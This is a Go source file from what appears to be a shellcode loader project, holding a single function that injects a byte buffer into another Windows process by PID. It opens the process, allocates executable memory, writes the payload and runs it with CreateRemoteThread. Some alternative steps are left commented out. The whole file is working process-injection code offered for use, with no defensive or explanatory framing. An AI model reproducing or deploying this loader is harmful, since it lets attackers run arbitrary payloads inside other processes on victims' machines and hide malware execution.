package loaders

import (
	"fmt"
	"unsafe"

	"github.com/mszatanik/goloader/pkg/win32"
)

func ExecuteShellcodeInRemoteProcess(bytes []byte, pid uint32) {
	fmt.Printf("[*] Injecting %d bytes\r\n", len(bytes))

	// OpenProcess
	remoteProcHandle, err := win32.OpenProcessCall(
		win32.CREATE_THREAD|win32.QUERY_INFORMATION|win32.VM_OPERATION|win32.VM_WRITE|win32.VM_READ,
		0,
		uintptr(pid),
	)

	if remoteProcHandle == 0 {
		panic(fmt.Sprintf("[-] OpenProcess failed: %s", err))
	}

	// VirtualAllocEx
	addr, err := win32.VirtualAllocExCall(
		remoteProcHandle,
		0,
		uintptr(len(bytes)),
		win32.MEM_COMMIT|win32.MEM_RESERVE,
		//win32.PAGE_READWRITE,
		win32.PAGE_EXECUTE_READWRITE,
	)
	if err != nil && addr == 0 {
		panic(fmt.Sprintf("[-] VirtualAllocEx failed: %s\r\n%d", err, addr))
	}

	// WriteProcessMemory
	bytesWritten, err := win32.WriteProcessMemoryCall(
		remoteProcHandle,
		addr,
		(uintptr)(unsafe.Pointer(&bytes[0])),
		uintptr(len(bytes)),
	)
	if bytesWritten == 0 {
		panic(fmt.Sprintf("[-] WriteProcessMemory failed: %s", err))
	}

	//VirtualProtectEx
	// oldProt, err := win32.VirtualProtectExCall(
	// 	remoteProcHandle,
	// 	addr,
	// 	uintptr(len(bytes)),
	// 	win32.PAGE_EXECUTE_READWRITE,
	// )
	// if err != nil {
	// 	panic(fmt.Sprintf("[-] VirtualProtectEx failed: %s\r\n%d", err, oldProt))
	// }

	// GetProcAddress
	// loadLibraryAPointer, err := syscall.BytePtrFromString("LoadLibraryA")
	// if err != nil {
	// 	panic(fmt.Sprintf("[-] LoadLibraryA conversion failed: %s", err))
	// }

	// loadLibraryAAddress, err := win32.GetProcAddressCall(win32.Kernel32.Handle(), (uintptr)(unsafe.Pointer(loadLibraryAPointer)))
	// _, _, err = win32.GetProcAddress.Call(
	// 	win32.Kernel32.Handle(),
	// 	(uintptr)(unsafe.Pointer(loadLibraryAPointer)),
	// )
	// if loadLibraryAAddress == 0 {
	// 	panic(fmt.Sprintf("[-] GetProcAddress failed: %s", err))
	// }

	// CreateRemoteThread
	remoteThread, err := win32.CreateRemoteThreadCall(
		remoteProcHandle,
		0,
		0,
		addr,
		0,
		0,
	)
	if remoteThread == 0 {
		panic(fmt.Sprintf("[-] CreateRemoteThread failed: %s", err))
	}

	// WaitForSingleObject
	code, err := win32.WaitForSingleObjectCall(
		remoteThread,
		win32.INFINITE,
	)
	if code == 0xFFFFFFFF {
		panic(fmt.Sprintf("[-] WaitForSingleObject failed: %s", err))
	}

	// GetExitCodeThread
	// exitCode, err := win32.GetExitCodeThreadCall(remoteThread)
	// if exitCode == 0 {
	// 	panic(fmt.Sprintf("[-] GetExitCodeThread failed: %s", err))
	// }

	// CloseHandle
	exitCode, err := win32.CloseHandleCall(remoteThread)
	if exitCode == 0 {
		panic(fmt.Sprintf("[-] remoteProcHandle failed: %s", err))
	}

	exitCode, err = win32.CloseHandleCall(remoteProcHandle)
	if exitCode == 0 {
		panic(fmt.Sprintf("[-] remoteProcHandle failed: %s", err))
	}

	// VirtualFreeEx
	// exitCode, err = win32.VirtualFreeExCall(
	// 	remoteProcHandle,
	// 	addr,
	// 	0,
	// 	win32.MEM_RELEASE,
	// )
	// if exitCode == 0 {
	// 	panic(fmt.Sprintf("[-] VirtualFreeEx failed: %s", err))
	// }
}
